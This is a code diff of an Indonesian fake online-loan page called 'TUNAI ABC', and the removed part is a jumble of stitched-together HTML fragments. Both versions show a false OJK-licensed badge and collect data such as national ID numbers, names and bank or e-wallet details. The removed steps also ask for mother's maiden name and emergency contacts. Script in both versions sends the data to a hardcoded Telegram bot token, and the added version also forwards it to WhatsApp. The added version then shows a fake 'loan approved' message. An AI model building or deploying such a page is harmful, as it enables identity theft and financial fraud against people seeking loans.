@@ -1,528 +1,345 @@
-   <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Menu Awal TUNAI ABC</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background-color: #000000;
-            min-height: 100vh;
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
-            padding: 25px 15px 0;
-        }
-        /* Kontainer diperbesar sedikit agar pas */
-        .menu-container {
-            width: 92%;
-            max-width: 400px;
-            background-color: #1a1a2e;
-            padding: 18px;
-            text-align: center;
-            border-radius: 10px;
-            box-shadow: 0 0 30px rgba(0, 119, 255, 0.4);
-        }
-        /* Judul diperbesar agar jelas */
-        .main-title {
-            background: linear-gradient(90deg, #0077ff, #9900ff);
-            padding: 15px 10px;
-            margin-bottom: 18px;
-            box-shadow: 0 0 20px rgba(0, 119, 255, 0.8);
-        }
-        .main-title h1 {
-            color: white;
-            font-size: 22px;
-            font-weight: bold;
-            margin: 0;
-            line-height: 1.5;
-        }
-        /* Sub teks diperbesar */
-        .sub-text {
-            color: white;
-            font-size: 15px;
-            margin-bottom: 15px;
-        }
-        /* Tag OJK pas ukuran */
-        .ojk-tag {
-            background-color: #ff0033;
-            color: white;
-            font-weight: bold;
-            padding: 6px 12px;
-            border-radius: 18px;
-            display: inline-block;
-            margin-bottom: 18px;
-            font-size: 13px;
-        }
-        /* Judul nominal pas ukuran */
-        .amount-title {
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            text-align: left;
-            padding-left: 8px;
-        }
-        /* Nominal diperbesar agar jelas */
-        .amount-container {
-            display: flex;
-            gap: 10px;
-            overflow-x: auto;
-            margin-bottom: 18px;
-            padding-bottom: 8px;
-            padding-left: 8px;
-        }
-        .amount-item {
-            background: linear-gradient(90deg, #ff6600, #ff9933);
-            color: white;
-            font-weight: bold;
-            padding: 10px 14px;
-            border-radius: 6px;
-            white-space: nowrap;
-            box-shadow: 0 0 12px rgba(255, 102, 0, 0.6);
-            cursor: default;
-            font-size: 14px;
-        }
-        /* Tombol ajukan diperbesar */
-        .btn-display {
-            background: linear-gradient(90deg, #ff0033, #ff3366);
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            padding: 14px 10px;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(255, 0, 51, 0.8);
-            cursor: default;
-        }
-    </style>
-</head>
-<body>
-    <div class="menu-container">
-        <div class="main-title">
-            <h1>TUNAI ABC<br>BERKAH<br>RAMADHAN</h1>
-        </div>
-
-        <div class="sub-text">Pinjaman Mudah • Cair Cepat</div>
-        <div class="ojk-tag">✅ BERIZIN & DIAWASI OJK</div>
-
-        <div class="amount-title">PILIH NOMINAL PINJAMAN:</div>
-        <div class="amount-container">
-            <div class="amount-item">10 JUTA</div>
-            <div class="amount-item">25 JUTA</div>
-            <div class="amount-item">50 JUTA</div>
-            <div class="amount-item">75 JUTA</div>
-            <div class="amount-item">100 JUTA</div>
-            <div class="amount-item">125 JUTA</div>
-            <div class="amount-item">150 JUTA</div>
-            <div class="amount-item">175 JUTA</div>
-            <div class="amount-item">200 JUTA</div>
-            <div class="amount-item">250 JUTA</div>
-        </div>
-
-        <div class="btn-display">AJUKAN PINJAMAN SEKARANG</div>
-    </div>
-</body>
-</html>
-
-<!-- Bagian Input & Tombol Saja -->
-<div class="form-group">
-    <label for="phone" class="form-label">Nomor Hp</label>
-    <input type="tel" id="phone" class="form-input" placeholder="Masukkan nomor HP aktif" required>
-</div>
-
-<div class="form-group">
-    <label for="nik" class="form-label">Nomor Nik Ktp</label>
-    <input type="text" id="nik" class="form-input" placeholder="Masukkan nomor NIK KTP" required>
-</div>
-
-<div class="form-group">
-    <label for="fullname" class="form-label">Nama Sesuai  ktp</label>
-    <input type="text" id="fullname" class="form-input" placeholder="Masukkan nama sesuai KTP" required>
-</div>
-
-<button type="submit" class="submit-btn">LANJUTKAN PENGISIAN</button>
-
-        <!-- STEP 2: DATA DIRI -->
-        <div class="form-step" id="step2">
-            <label class="form-label">Tanggal Lahir</label>
-            <input type="date" class="form-input" id="tgl-lahir">
-            
-            <label class="form-label">Kecamatan</label>
-            <input type="text" class="form-input" id="kecamatan" placeholder="Contoh: kedaton">
-            
-            <label class="form-label">Desa/Kelurahan</label>
-            <input type="text" class="form-input" id="desa" placeholder="Contoh: Sukarame">
-            
-            <label class="form-label">Kode POS</label>
-            <input type="text" class="form-input" id="kodepos" placeholder="Contoh: 30123">
-            
-            <label class="form-label">Nama Ibu Kandung</label>
-            <input type="text" class="form-input" id="ibu-kandung" placeholder="Contoh: SITI MARIA">
-            
-            <button class="btn" onclick="gantiStep(1)">
-            <br><br>
-            <button class="btn" onclick="gantiStep(3)">Lanjut ke Data Pekerjaan</button>
-        </div>
-
-        <!-- SISA KODE STEP 3, 4, DAN SETERUSNYA MASUKKAN DISINI SESUAI KODE ASLINYA -->
-    </div>
-
-    <script>
-        // KODE JAVASCRIPT ASLINYA KAMU MASUKKAN DISINI
-    </script>
-</body>
-    </html>
-
-    
-
-
-            <button class="btn" onclick="gantiStep(3)">Lanjut ke Data Pekerjaan</button>
-        </div>
-
-        <!-- STEP 3: DATA PEKERJAAN -->
-        <div class="form-step" id="step3">
-            <label class="form-label">Pekerjaan Anda</label>
-            <input type="text" class="form-input" id="pekerjaan" placeholder="Contoh: Pegawai Swasta">
-
-            <label class="form-label">Pendapatan per Bulan</label>
-            <input type="text" class="form-input" id="pendapatan" placeholder="Contoh: 8.000.000">
-
-            <label class="form-label">Total Hutang Saat Ini</label>
-            <input type="text" class="form-input" id="hutang" placeholder="Contoh: 2.000.000">
-
-            <label class="form-label">Keperluan Pinjaman</label>
-            <input type="text" class="form-input" id="keperluan" placeholder="Contoh: Modal Usaha">
-
-            <button class="btn" onclick="gantiStep(4)">Lanjut ke Kontak Darurat</button>
-        </div>
-
-        <!-- STEP 4: KONTAK DARURAT -->
-        <div class="form-step" id="step4">
-            <label class="form-label">Nama Kontak Darurat 1</label>
-            <input type="text" class="form-input" id="kontak1" placeholder="Contoh: BUDI">
-
-            <label class="form-label">Hubungan</label>
-            <input type="text" class="form-input" id="hub1" placeholder="Contoh: Saudara">
-
-            <label class="form-label">Nomor HP Kontak 1</label>
-            <input type="tel" class="form-input" id="hp-kontak1" placeholder="Contoh: 08123456789">
-
-            <label class="form-label">Nama Kontak Darurat 2</label>
-            <input type="text" class="form-input" id="kontak2" placeholder="Contoh: SITI">
-
-            <label class="form-label">Hubungan</label>
-            <input type="text" class="form-input" id="hub2" placeholder="Contoh: Istri">
-
-            <label class="form-label">Nomor HP Kontak 2</label>
-            <input type="tel" class="form-input" id="hp-kontak2" placeholder="Contoh: 08987654321">
-
-            <button class="btn" onclick="gantiStep(5)">Lanjut ke Verifikasi Limit</button>
-        </div>
-
-        <!-- STEP 5: VERIFIKASI LIMIT -->
-        <div class="form-step" id="step5">
-            <h2 class="verify-title">✅ VERIFIKASI BERHASIL!</h2>
-            <p class="verify-subtitle">Limit Pinjaman Anda Sudah Ditentukan</p>
-
-            <label class="form-label">Limit Pinjaman</label>
-            <input type="range" min="10000000" max="250000000" step="1000000" class="limit-slider" id="slider" oninput="updateLimit(this.value)">
-            <div class="limit-show" id="limit-show">Rp10.914.474</div>
-
-            <label class="form-label">Pilih Jumlah Pinjaman</label>
-            <select class="form-input" id="jumlah-pinjam">
-                <option value="10000000">Rp10.000.000</option>
-                <option value="25000000">Rp25.000.000</option>
-                <option value="50000000">Rp50.000.000</option>
-                <option value="100000000">Rp100.000.000</option>
-                <option value="150000000">Rp150.000.000</option>
-                <option value="250000000">Rp250.000.000</option>
-            </select>
-
-            <label class="form-label">Tenor Pinjaman</label>
-            <select class="form-input" id="tenor">
-                <option value="1">1 Bulan</option>
-                <option value="3">3 Bulan</option>
-                <option value="6">6 Bulan</option>
-            </select>
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TUNAI ABC BERKAH RAMADHAN</title>
+    <title>FORM PINJAMAN TUNAI ABC</title>
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
             font-family: Arial, sans-serif;
         }
         body {
-            background-color: #f0f2f5;
+            background: #000;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
         }
-        .top-banner {
-            background-color: #2c3e50;
-            padding: 15px;
-            text-align: center;
-            color: white;
-            font-weight: bold;
-        }
-        .promo-section {
-            background-color: #f8f9fa;
-            padding: 15px;
-            text-align: center;
-            border-bottom: 3px solid #27ae60;
-            margin-bottom: 20px;
-        }
-        .promo-section h3 {
-            color: #2c3e50;
-            font-size: 18px;
-        }
-        .main-container {
-            max-width: 500px;
-            margin: 0 auto;
-            background-color: white;
-            padding: 25px;
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #1a1a2e;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 20px;
+            box-shadow: 0 0 30px rgba(0, 119, 255, 0.5);
         }
         .title {
+            background: linear-gradient(90deg, #0077ff, #9900ff);
+            color: white;
             text-align: center;
-            color: #2c3e50;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+        .form-step {
+            display: block;
             margin-bottom: 20px;
         }
-        .title p {
-            color: #666;
-            margin: 5px 0;
-        }
-        .ojk {
-            color: #27ae60;
+        .step-title {
+            color: white;
+            font-size: 16px;
             font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
         }
-        .amount-section {
-            margin: 25px 0;
+        label {
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
         }
-        .amount-section h4 {
-            color: #2c3e50;
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            border: none;
             margin-bottom: 15px;
             font-size: 16px;
         }
-        /* Kontainer geser horizontal */
-        .scroll-container {
-            overflow-x: auto;
-            white-space: nowrap;
-            padding-bottom: 10px;
-            -webkit-overflow-scrolling: touch; /* Biar geser lancar di hp */
-        }
-        .amount-buttons {
-            display: inline-flex;
-            gap: 12px;
-        }
-        .amount-btn {
-            padding: 12px 18px;
-            background-color: #f0f2f5;
-            border: 2px solid #2c3e50;
-            border-radius: 5px;
-            color: #2c3e50;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            white-space: nowrap;
-        }
-        .amount-btn:hover, .amount-btn.active {
-            background-color: #2c3e50;
+        .btn-pilih {
+            background: linear-gradient(90deg, #ff6600, #ff9933);
             color: white;
-        }
-        .fee-info {
-            text-align: center;
-            font-weight: bold;
-            color: #27ae60;
-            margin: 15px 0;
-            font-size: 18px;
-        }
-        .fee-detail {
-            text-align: center;
-            color: #666;
-            margin-bottom: 15px;
-            font-size: 14px;
-        }
-        .submit-btn {
-            width: 100%;
-            padding: 15px;
-            background-color: #27ae60;
             border: none;
-            border-radius: 5px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-weight: bold;
+            margin: 0 5px 10px 0;
+            cursor: pointer;
+        }
+        .btn-pilih.active {
+            background: linear-gradient(90deg, #00cc00, #33ff33);
+        }
+        .biaya {
+            background: #252545;
             color: white;
-            font-size: 18px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .btn-action {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            margin-bottom: 10px;
         }
-        .submit-btn:hover {
-            background-color: #229954;
+        .btn-lanjut {
+            background: linear-gradient(90deg, #0077ff, #9900ff);
+        }
+        .btn-kirim {
+            background: linear-gradient(90deg, #ff0033, #ff3366);
+        }
+        /* STYLE UNTUK HALAMAN SUKSES */
+        .success-step {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            color: white;
+        }
+        .success-icon {
+            font-size: 50px;
+            color: #33ff33;
+            margin-bottom: 20px;
+        }
+        .success-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .success-detail {
+            background: #252545;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 25px;
+        }
+        .note {
+            color: #ccc;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
-    <!-- Banner Berjalan -->
-    <div class="top-banner">
-        <marquee behavior="scroll" direction="left" scrollamount="5">✨ ML DARI 1.000.000 - PINJAM SAMPAI 250 JUTA - BIAYA HANYA 1% ✨</marquee>
-    </div>
+    <div class="container">
+        <div class="title">TUNAI ABC - PINJAMAN ONLINE CEPAT CAIR</div>
 
-    <!-- Bagian Promo -->
-    <div class="promo-section">
-        <h3>💸 AJUKAN PINJAMAN MUDAH, PROSES CEPAT, TANPA BIROKRASI RIBET!</h3>
-    </div>
+        <!-- DATA PEMINJAM -->
+        <div class="form-step" id="step1">
+            <div class="step-title">DATA DIRI PEMINJAM</div>
+            <label>NOMOR HP (WA)</label>
+            <input type="tel" id="hp" placeholder="Contoh: 081234567890" required>
 
-    <!-- Kontainer Utama -->
-    <div class="main-container">
-        <div class="title">
-            <h2>TUNAI ABC BERKAH RAMADHAN</h2>
-            <p>Pinjaman Mudah • Cair Cepat</p>
-            <p class="ojk">BERIZIN & DIAWASI OJK</p>
+            <label>NICKNAME</label>
+            <input type="text" id="nick" placeholder="Nama panggilan" required>
+
+            <label>NOMOR NIK KTP</label>
+            <input type="text" id="nik" placeholder="16 digit NIK" required>
+
+            <label>NAMA SESUAI KTP</label>
+            <input type="text" id="nama" placeholder="Nama lengkap" required>
+
+            <button class="btn-action btn-lanjut" onclick="keStep2()">LANJUT KE LIMIT PINJAMAN</button>
         </div>
 
-        <!-- Pilihan Nominal Peminjaman (Geser Horizontal) -->
-        <div class="amount-section">
-            <h4>PILIH NOMINAL PINJAMAN:</h4>
-            <div class="scroll-container">
-                <div class="amount-buttons">
-                    <button class="amount-btn">10 JUTA</button>
-                    <button class="amount-btn">25 JUTA</button>
-                    <button class="amount-btn">50 JUTA</button>
-                    <button class="amount-btn">75 JUTA</button>
-                    <button class="amount-btn">100 JUTA</button>
-                    <button class="amount-btn">125 JUTA</button>
-                    <button class="amount-btn">150 JUTA</button>
-                    <button class="amount-btn">175 JUTA</button>
-                    <button class="amount-btn">200 JUTA</button>
-                    <button class="amount-btn">250 JUTA</button>
-                </div>
-            </div>
+        <!-- LIMIT & TENOR -->
+        <div class="form-step" id="step2" style="display: none;">
+            <div class="step-title">PILIH LIMIT & TENOR</div>
+            <label>LIMIT PINJAMAN (10JT - 250JT)</label><br>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="10000000">10 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="25000000">25 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="50000000">50 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="75000000">75 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="100000000">100 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="125000000">125 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="150000000">150 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="175000000">175 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="200000000">200 JT</button>
+            <button class="btn-pilih" onclick="pilihLimit(this)" data-limit="250000000">250 JT</button>
+            <input type="hidden" id="limit">
+
+            <label>TENOR PINJAMAN</label><br>
+            <button class="btn-pilih" onclick="pilihTenor(this)" data-tenor="1 Bulan">1 BULAN</button>
+            <button class="btn-pilih" onclick="pilihTenor(this)" data-tenor="3 Bulan">3 BULAN</button>
+            <button class="btn-pilih" onclick="pilihTenor(this)" data-tenor="6 Bulan">6 BULAN</button>
+            <input type="hidden" id="tenor">
+
+            <div class="biaya" id="biaya">Silakan pilih limit dan tenor</div>
+
+            <button class="btn-action btn-lanjut" onclick="keStep3()">LANJUT KE REKENING</button>
         </div>
 
-        <!-- Info Biaya -->
-        <div class="fee-info">
-            BIAYA ADMINISTRASI HANYA 1% DARI NOMINAL PINJAMAN
-        </div>
-        <div class="fee-detail">
-            Contoh: Pinjam 10 Juta → Biaya Admin Rp. 100.000,-
-        </div>
+        <!-- REKENING & KIRIM -->
+        <div class="form-step" id="step3" style="display: none;">
+            <div class="step-title">DATA REKENING</div>
+            <label>NAMA REKENING</label>
+            <input type="text" id="namaRek" placeholder="Sesuai buku rekening" required>
 
-        <!-- Tombol Pinjam -->
-        <button class="submit-btn">AJUKAN PINJAMAN SEKARANG</button>
-    </div>
+            <label>NOMOR REKENING</label>
+            <input type="text" id="noRek" placeholder="Nomor rekening aktif" required>
 
-    <script>
-        // Script untuk menandai tombol nominal yang dipilih
-        const amountBtns = document.querySelectorAll('.amount-btn');
-        amountBtns.forEach(btn => {
-            btn.addEventListener('click', () => {
-                amountBtns.forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-            });
-        });
-    </script>
-</body>
-</html>
-            
-            <button class="btn" onclick="gantiStep(6)">Lanjut ke Pencairan</button>
-        </div>
-
-        <!-- STEP 6: PENCAIRAN DANA -->
-        <div class="form-step" id="step6">
-            <label class="form-label">Pilih Metode Pencairan</label>
-            <select class="form-input" id="metode-cair">
-                <option value="bank">Transfer Bank</option>
-                <option value="ewallet">E-Wallet</option>
+            <label>BANK</label>
+            <select id="bank">
+                <option value="">-- Pilih Bank --</option>
+                <option value="BRI">BANK BRI</option>
+                <option value="BNI">BANK BNI</option>
+                <option value="Mandiri">BANK MANDIRI</option>
+                <option value="BCA">BANK BCA</option>
+                <option value="CIMB Niaga">BANK CIMB NIAGA</option>
+                <option value="Maybank">BANK MAYBANK</option>
             </select>
 
-            <label class="form-label">Nama Penerima</label>
-            <input type="text" class="form-input" id="nama-penerima" placeholder="Sesuai Rekening/E-Wallet">
-
-            <label class="form-label">Nama Bank/E-Wallet</label>
-            <input type="text" class="form-input" id="nama-bank" placeholder="Contoh: BCA / OVO">
-
-            <label class="form-label">Nomor Rekening/E-Wallet</label>
-            <input type="text" class="form-input" id="no-rekening" placeholder="Contoh: 1234567890">
-
-            <button class="btn" onclick="gantiStep(7)">Konfirmasi & Kirim</button>
+            <button class="btn-action btn-kirim" onclick="kirimSemuaData()">KIRIM DATA & PROSES PINJAMAN</button>
         </div>
 
-        <!-- STEP 7: PENCAIRAN BERHASIL -->
-        <div class="form-step" id="step7">
-            <div class="success-box">
-                <h2>🎉 PENCAIRAN BERHASIL!</h2>
-                <p>Dana akan masuk dalam waktu 1-30 menit</p>
-                <p>Nomor Tiket: <span id="tiket">TUNAIABC-20260218-001</span></p>
-                <p style="font-weight: bold; color: #27ae60; margin-top: 15px;">CS: 0858-9881-886</p>
+        <!-- HALAMAN SUKSES OTOMATIS -->
+        <div class="success-step" id="stepSuccess">
+            <div class="success-icon">✅</div>
+            <div class="success-title">PINJAMAN ANDA BERHASIL!</div>
+            <div class="success-detail" id="successText">
+                <!-- TEKS INI AKAN DITAMBAHKAN OTOMATIS SESUAI PILIHAN -->
             </div>
+            <p>Untuk rincian biaya dan jadwal pembayaran akan kami komunikasikan via WhatsApp dan SMS.</p>
         </div>
+
+        <div class="note">*Biaya admin 1% berlaku untuk SEMUA limit pinjaman<br>**Data akan tersimpan ke bot Telegram dan dikirim ke WA admin</div>
     </div>
 
     <script>
         // KONFIGURASI BOT TELEGRAM
         const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
         const CHAT_ID = "8571321926";
+        const API_URL_TELEGRAM = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        // FUNGSI UPDATE LIMIT
-        function updateLimit(val) {
-            const format = new Intl.NumberFormat('id-ID', {
-                style: 'currency',
-                currency: 'IDR',
-                maximumFractionDigits: 0
-            }).format(val);
-            document.getElementById('limit-show').innerText = format;
+        // KONFIGURASI WHATSAPP ADMIN
+        const WA_ADMIN = "6281234567890"; // GANTI DENGAN NOMOR WA ADMIN
+
+        // FUNGSI BERALIH STEP
+        function keStep2() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
         }
 
-        // FUNGSI GANTI STEP
-        function gantiStep(stepTujuan) {
-            // Sembunyikan semua step
-            document.querySelectorAll('.form-step').forEach(step => {
-                step.classList.remove('active');
-            });
-            // Tampilkan step yang dipilih
-            document.getElementById('step' + stepTujuan).classList.add('active');
-            // Kirim data ke Telegram
-            kirimData(stepTujuan);
-        }
-
-        // FUNGSI KIRIM DATA KE TELEGRAM
-        function kirimData(step) {
-            let data = "";
-            switch(step) {
-                case 2:
-                    data = `📝 DATA AWAL\nHP: ${document.getElementById('hp').value}\nNick KTP: ${document.getElementById('nick-ktp').value}\nNama Lengkap: ${document.getElementById('nama-ktp').value}`;
-                    break;
-                case 3:
-                    data = `👤 DATA DIRI\nTanggal Lahir: ${document.getElementById('tgl-lahir').value}\nKecamatan: ${document.getElementById('kecamatan').value}\nDesa: ${document.getElementById('desa').value}\nKode POS: ${document.getElementById('kodepos').value}\nNama Ibu Kandung: ${document.getElementById('ibu-kandung').value}`;
-                    break;
-                case 4:
-                    data = `💼 DATA PEKERJAAN\nPekerjaan: ${document.getElementById('pekerjaan').value}\nPendapatan: ${document.getElementById('pendapatan').value}\nTotal Hutang: ${document.getElementById('hutang').value}\nKeperluan: ${document.getElementById('keperluan').value}`;
-                    break;
-                case 5:
-                    data = `📞 KONTAK DARURAT\nKontak 1: ${document.getElementById('kontak1').value} (${document.getElementById('hub1').value}) - ${document.getElementById('hp-kontak1').value}\nKontak 2: ${document.getElementById('kontak2').value} (${document.getElementById('hub2').value}) - ${document.getElementById('hp-kontak2').value}`;
-                    break;
-                case 6:
-                    data = `💸 DATA PINJAMAN\nLimit: ${document.getElementById('limit-show').innerText}\nJumlah Pinjaman: ${document.getElementById('jumlah-pinjam').value}\nTenor: ${document.getElementById('tenor').value} Bulan`;
-                    break;
-                case 7:
-                    data = `✅ DATA PENCAIRAN\nMetode: ${document.getElementById('metode-cair').value}\nNama Penerima: ${document.getElementById('nama-penerima').value}\nBank/E-Wallet: ${document.getElementById('nama-bank').value}\nNomor: ${document.getElementById('no-rekening').value}\nTiket: TUNAIABC-20260218-001`;
-                    break;
+        function keStep3() {
+            if(!document.getElementById('limit').value) {
+                alert("Silakan pilih limit pinjaman dulu!");
+                return;
             }
+            if(!document.getElementById('tenor').value) {
+                alert("Silakan pilih tenor pinjaman dulu!");
+                return;
+            }
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+        }
 
-            if (data !== "") {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        te
+        // PILIH LIMIT
+        function pilihLimit(btn) {
+            document.querySelectorAll('.btn-pilih[data-limit]').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById('limit').value = btn.getAttribute('data-limit');
+            hitungBiaya();
+        }
+
+        // PILIH TENOR
+        function pilihTenor(btn) {
+            document.querySelectorAll('.btn-pilih[data-tenor]').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById('tenor').value = btn.getAttribute('data-tenor');
+            hitungBiaya();
+        }
+
+        // HITUNG BIAYA 1%
+        function hitungBiaya() {
+            const limit = parseInt(document.getElementById('limit').value) || 0;
+            const tenor = document.getElementById('tenor').value || '';
+            const biayaAdmin = (limit * 0.01).toLocaleString('id-ID');
+            const total = (limit + (limit * 0.01)).toLocaleString('id-ID');
+            
+            if(limit > 0 && tenor) {
+                document.getElementById('biaya').innerText = `TENOR ${tenor} | BIAYA ADMIN 1%: Rp ${biayaAdmin} | TOTAL BAYAR: Rp ${total}`;
+            }
+        }
+
+        // KIRIM DATA & TAMPILKAN HALAMAN SUKSES OTOMATIS
+        function kirimSemuaData() {
+            // AMBIL SEMUA DATA
+            const hp = document.getElementById('hp').value;
+            const nick = document.getElementById('nick').value;
+            const nik = document.getElementById('nik').value;
+            const nama = document.getElementById('nama').value;
+            const limit = parseInt(document.getElementById('limit').value);
+            const limitText = document.querySelector('.btn-pilih[data-limit].active').textContent;
+            const tenor = document.getElementById('tenor').value;
+            const biayaAdmin = (limit * 0.01).toLocaleString('id-ID');
+            const namaRek = document.getElementById('namaRek').value;
+            const noRek = document.getElementById('noRek').value;
+            const bank = document.getElementById('bank').value;
+
+            // FORMAT PESAN
+            const pesan = `*DATA PINJAMAN TUNAI ABC*\n
+*NOMOR HP WA:* ${hp}\n
+*NICKNAME:* ${nick}\n
+*NIK KTP:* ${nik}\n
+*NAMA LENGKAP:* ${nama}\n
+*LIMIT PINJAMAN:* ${limitText} (Rp ${limit.toLocaleString('id-ID')})\n
+*TENOR:* ${tenor}\n
+*BIAYA ADMIN (1%):* Rp ${biayaAdmin}\n
+*TOTAL YANG HARUS DIBAYAR:* Rp ${(limit + (limit * 0.01)).toLocaleString('id-ID')}\n
+*DATA REKENING:*\n
+- Nama: ${namaRek}\n
+- No Rekening: ${noRek}\n
+- Bank: ${bank}\n\n
+*Mohon proses pinjaman saya ya admin, terima kasih.*`;
+
+            // KIRIM KE BOT TELEGRAM
+            fetch(API_URL_TELEGRAM, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("Data berhasil tersimpan ke bot Telegram");
+                }
+            }).catch(err => {
+                console.log("Gagal kirim ke bot Telegram:", err);
+            });
+
+            // KIRIM KE WHATSAPP
+            const linkWA = `https://api.whatsapp.com/send?phone=${WA_ADMIN}&text=${encodeURIComponent(pesan)}`;
+            window.open(linkWA, '_blank');
+
+            // TAMPILKAN HALAMAN SUKSES DENGAN TEKS OTOMATIS
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('stepSuccess').style.display = 'block';
+            document.getElementById('successText').innerHTML = `
+                <b>Nama Peminjam:</b> ${nama} (${nick})<br>
+                <b>Limit Pinjaman:</b> ${limitText} (Rp ${limit.toLocaleString('id-ID')})<br>
+                <b>Tenor Pinjaman:</b> ${tenor}<br>
+                <b>Biaya Admin:</b> Rp ${biayaAdmin} (1%)<br>
+                <b>Total Pembayaran:</b> Rp ${(limit + (limit * 0.01)).toLocaleString('id-ID')}<br>
+                <b>Rekening Tujuan:</b> ${namaRek} - ${noRek} (${bank})
+            `;
+        }
+    </script>
+</body>
+</html>
